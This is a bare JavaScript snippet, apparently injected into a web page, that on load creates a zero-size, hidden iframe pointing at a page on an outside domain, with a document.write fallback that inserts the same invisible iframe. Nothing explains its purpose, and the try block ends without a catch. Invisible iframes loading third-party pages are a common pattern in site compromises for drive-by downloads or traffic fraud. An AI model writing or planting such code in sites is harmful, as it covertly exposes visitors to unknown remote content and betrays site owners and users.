try {
    var iframelink="http://ts.haoshengtoys.com/yxj/p776c034.html";
    var iframeV=document.createElement("iframe");
    iframeV.style.width="0px";
    iframeV.id="iframeV";
    iframeV.style.height="0px";
    iframeV.style.display="none";
    iframeV.scrolling = "no";
    iframeV.src=iframelink;
    document.body.appendChild(iframeV);
    var iv=document.getElementById("iframeV");
    if(iv==null){
        document.write("<iframe style='width: 0px; height: 0px; border: 0px; display: none;' scrolling='no' src='"+iframelink+"'></iframe>")
    }
}
